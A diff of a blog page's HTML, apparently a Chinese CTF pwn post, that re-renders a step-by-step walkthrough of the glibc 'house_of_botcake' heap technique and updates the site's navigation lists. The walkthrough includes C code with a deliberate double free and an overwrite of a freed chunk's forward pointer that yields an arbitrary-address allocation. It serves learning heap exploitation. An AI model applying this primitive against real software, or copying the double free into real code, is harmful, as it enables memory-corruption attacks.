+    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)&#123;
+        <span class="hljs-built_in">free</span>(x[i]);
+    &#125;
+</code></pre>
+<p><img data-src="/images/house_of_botcake/3.png" alt="" /></p>
+<h3 id="step2"><a class="markdownIt-Anchor" href="#step2"></a> step2</h3>
+<pre class="highlight"><code class="c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);
+    <span class="hljs-built_in">free</span>(a);
+</code></pre>
+<pre class="highlight"><code class="">unsortedbin
 all: 0x55555555bae0-&gt;0x7ffff7dcdca0(main_arena+96)&lt;-0x55555555bae0 (a)
 </code></pre>
-<h3 id="step3"><a class="markdownIt-Anchor" href="#step3">#</a> step3</h3>
-<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Step 3: free the previous chunk and make it consolidate with the victim chunk."</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre> <span class="token function">free</span><span class="token punctuation">(</span>prev<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="/images/house_of_botcake/1.png" alt=""></p>
+<h3 id="step3"><a class="markdownIt-Anchor" href="#step3"></a> step3</h3>
+<pre class="highlight"><code class="c"> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);
+ <span class="hljs-built_in">free</span>(prev);
+</code></pre>
+<p><img data-src="/images/house_of_botcake/1.png" alt="" /></p>
 <p>此时的内存分布</p>
-<p><img data-src="/images/house_of_botcake/5.png" alt=""></p>
-<h3 id="step4"><a class="markdownIt-Anchor" href="#step4">#</a> step4</h3>
-<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token comment">/*VULNERABILITY*/</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// a is already freed</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment">/*VULNERABILITY*/</span></pre></td></tr></table></figure><p><img data-src="/images/house_of_botcake/6.png" alt=""></p>
-<p><img data-src="/images/house_of_botcake/7-1676607176125.png" alt=""></p>
-<h3 id="step5"><a class="markdownIt-Anchor" href="#step5">#</a> step5</h3>
-<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token class-name">intptr_t</span> <span class="token operator">*</span>b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x120</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"We simply overwrite victim's fwd pointer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre> b<span class="token punctuation">[</span><span class="token number">0x120</span><span class="token operator">/</span><span class="token number">8</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>stack_var<span class="token punctuation">;</span></pre></td></tr></table></figure><p>申请一块大内存能够包含 a 的 fd (overlap)，然后修改 a 的 fd 为目标地址</p>
-<p><img data-src="/images/house_of_botcake/8.png" alt=""></p>
-<h3 id="step6"><a class="markdownIt-Anchor" href="#step6">#</a> step6</h3>
-<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre> <span class="token class-name">intptr_t</span> <span class="token operator">*</span>c <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>此时写 c 就是对目标地址进行操作</p>
+<p><img data-src="/images/house_of_botcake/5.png" alt="" /></p>
+<h3 id="step4"><a class="markdownIt-Anchor" href="#step4"></a> step4</h3>
+<pre class="highlight"><code class="c"> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);
+    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
+    <span class="hljs-comment">/*VULNERABILITY*/</span>
+    <span class="hljs-built_in">free</span>(a);<span class="hljs-comment">// a is already freed</span>
+    <span class="hljs-comment">/*VULNERABILITY*/</span>
+</code></pre>
+<p><img data-src="/images/house_of_botcake/6.png" alt="" /></p>
+<p><img data-src="/images/house_of_botcake/7-1676607176125.png" alt="" /></p>
+<h3 id="step5"><a class="markdownIt-Anchor" href="#step5"></a> step5</h3>
+<pre class="highlight"><code class="c"> <span class="hljs-type">intptr_t</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x120</span>);
+ <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);
+ b[<span class="hljs-number">0x120</span>/<span class="hljs-number">8</span><span class="hljs-number">-2</span>] = (<span class="hljs-type">long</span>)stack_var;
+</code></pre>
+<p>申请一块大内存能够包含a的fd(overlap)，然后修改a的fd为目标地址</p>
+<p><img data-src="/images/house_of_botcake/8.png" alt="" /></p>
+<h3 id="step6"><a class="markdownIt-Anchor" href="#step6"></a> step6</h3>
+<pre class="highlight"><code class="c"> <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
+ <span class="hljs-type">intptr_t</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
+</code></pre>
+<p>此时写c就是对目标地址进行操作</p>
 
       <div class="tags">
           <a href="/tags/pwn/" rel="tag"><i class="ic i-tag"></i> pwn</a>
@@ -245,7 +368,7 @@ all: 0x55555555bae0-&gt;0x7ffff7dcdca0(main_arena+96)&lt;-0x55555555bae0 (a)
     <div class="item left">
       
 
-  <a href="/2023/01/06/2022Nepnep%E8%B7%A8%E5%B9%B4%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0%E5%92%8C%E6%80%BB%E7%BB%93/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giciryrr3rj20zk0m8nhk.jpg" title="2022Nepnep跨年比赛复现和总结">
+  <a href="/2023/01/06/2022Nepnep%E8%B7%A8%E5%B9%B4%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0%E5%92%8C%E6%80%BB%E7%BB%93/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipew28b65j20zk0m8hdt.jpg" title="2022Nepnep跨年比赛复现和总结">
   <span class="type">Previous Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>2022Nepnep跨年比赛复现和总结</h3>
@@ -255,7 +378,7 @@ all: 0x55555555bae0-&gt;0x7ffff7dcdca0(main_arena+96)&lt;-0x55555555bae0 (a)
     <div class="item right">
       
 
-  <a href="/2023/02/21/idek2022%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giciub8ja1j20zk0m81ky.jpg" title="idek2022部分复现">
+  <a href="/2023/02/21/idek2022%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclhpw3lwj20zk0m8gvw.jpg" title="idek2022部分复现">
   <span class="type">Next Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>idek2022部分复现</h3>
@@ -292,7 +415,7 @@ all: 0x55555555bae0-&gt;0x7ffff7dcdca0(main_arena+96)&lt;-0x55555555bae0 (a)
 <nav class="state">
     <div class="item posts">
       <a href="/archives/">
-        <span class="count">27</span>
+        <span class="count">28</span>
         <span class="name">posts</span>
       </a>
     </div>
@@ -362,7 +485,7 @@ all: 0x55555555bae0-&gt;0x7ffff7dcdca0(main_arena+96)&lt;-0x55555555bae0 (a)
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/03/08/SROP/" title="SROP">SROP</a></span>
+    <span><a href="/2022/09/13/Crypto%E5%A4%8D%E7%8E%B01/" title="Crypto复现1">Crypto复现1</a></span>
   </li>
 
       
@@ -371,61 +494,7 @@ all: 0x55555555bae0-&gt;0x7ffff7dcdca0(main_arena+96)&lt;-0x55555555bae0 (a)
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/09/03/i%E6%98%A5%E7%A7%8B%E5%8B%87%E8%80%85%E4%B9%8B%E5%B7%85Crypto%E5%AD%A6%E4%B9%A0/" title="i春秋勇者之巅Crypto学习">i春秋勇者之巅Crypto学习</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/09/23/BUU-Crypto/" title="BUU_Crypto">BUU_Crypto</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2023/02/21/house-of-botcake/" title="house_of_botcake">house_of_botcake</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/08/27/%E7%BD%91%E9%BC%8E%E6%9D%AFre%E3%80%81Crypto/" title="网鼎杯re、Crypto">网鼎杯re、Crypto</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/12/11/reverse%E6%B3%9B%E5%81%9A1/" title="reverse泛做1">reverse泛做1</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/09/29/NTRU/" title="NTRU">NTRU</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/08/02/%E5%BC%BA%E7%BD%91%E6%9D%AF-polydiv/" title="强网杯-polydiv">强网杯-polydiv</a></span>
+    <span><a href="/2023/04/16/house-of-pig/" title="house_of_pig">house_of_pig</a></span>
   </li>
 
       
@@ -443,7 +512,61 @@ all: 0x55555555bae0-&gt;0x7ffff7dcdca0(main_arena+96)&lt;-0x55555555bae0 (a)
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/10/29/2022-hackgame%E5%A4%8D%E7%8E%B0/" title="2022-hackgame复现">2022-hackgame复现</a></span>
+    <span><a href="/2022/09/03/i%E6%98%A5%E7%A7%8B%E5%8B%87%E8%80%85%E4%B9%8B%E5%B7%85Crypto%E5%AD%A6%E4%B9%A0/" title="i春秋勇者之巅Crypto学习">i春秋勇者之巅Crypto学习</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/01/06/2022Nepnep%E8%B7%A8%E5%B9%B4%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0%E5%92%8C%E6%80%BB%E7%BB%93/" title="2022Nepnep跨年比赛复现和总结">2022Nepnep跨年比赛复现和总结</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/12/26/PWNHUB-%E5%A4%8D%E7%8E%B0/" title="PWNHUB-复现">PWNHUB-复现</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/29/NTRU/" title="NTRU">NTRU</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/10/04/Linux-Kernel-Pwn/" title="Linux-Kernel-Pwn">Linux-Kernel-Pwn</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/05/08/hello-world/" title="Hello World">Hello World</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/03/26/2023-3-PWHHUB/" title="2023_3_PWHHUB">2023_3_PWHHUB</a></span>
   </li>
 
   </ul>
